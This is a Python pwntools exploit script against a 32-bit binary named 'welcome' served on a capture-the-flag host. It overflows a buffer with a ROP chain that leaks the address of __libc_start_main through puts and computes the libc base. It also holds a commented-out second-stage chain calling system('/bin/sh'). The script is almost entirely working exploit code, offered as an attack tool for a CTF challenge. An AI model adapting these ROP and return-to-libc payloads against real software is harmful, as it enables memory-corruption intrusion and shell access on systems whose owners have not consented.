from pwn import *
import time
#import pdb
exe = context.binary = ELF('welcome')

libc = ELF('/lib/i386-linux-gnu/libc.so.6')    	
#libc = ELF('libc6_2.27-3ubuntu1.4_i386.so')    	

remotehost = ('ctf.fibonhack.it', 16003)

gdbscript ='''
b *0x08049200
'''.format(**locals())

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(
            exe=exe.path, args=[exe.path] + argv,
            gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(*remotehost, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
        
context.log_level = 'debug'

addr = exe.sym
addr_got = exe.got
addr_plt = exe.plt
ret_addr = 0x080490af
leave_ret_addr = 0x080490f5
pop_ebp_addr = 0x0804926b
main = 0x08049070




io = start(env={"SPORCASTACK":"A"*123}) #env={"SPORCASTACK":"A"*123}
ui.pause()

io.recvline()
io.recvline()

	
buff = flat({
	    24: p32(exe.plt.puts) + p32(pop_ebp_addr),
	    32: p32(addr_got.__libc_start_main),
	    36: p32(pop_ebp_addr)*10 + p32(main),
	    110: b'A'
})	
io.sendline(buff)

libc_start_address = io.recvline().strip(b'\n')
libc_start_address = u32(libc_start_address[:4])
log.info(f"libc_start_address leakato: {libc_start_address}")

io.recvline()
io.recvline()

libc.address = libc_start_address - libc.sym.__libc_start_main 

'''
buff = flat({
    24: p32(libc.sym.system) + p32(pop_ebp_addr),
    32: p32(next(libc.search(b'/bin/sh'))),
    110: b'A'
})
'''
time.sleep(1)
io.sendline(b'A'*108)


	

io.interactive()

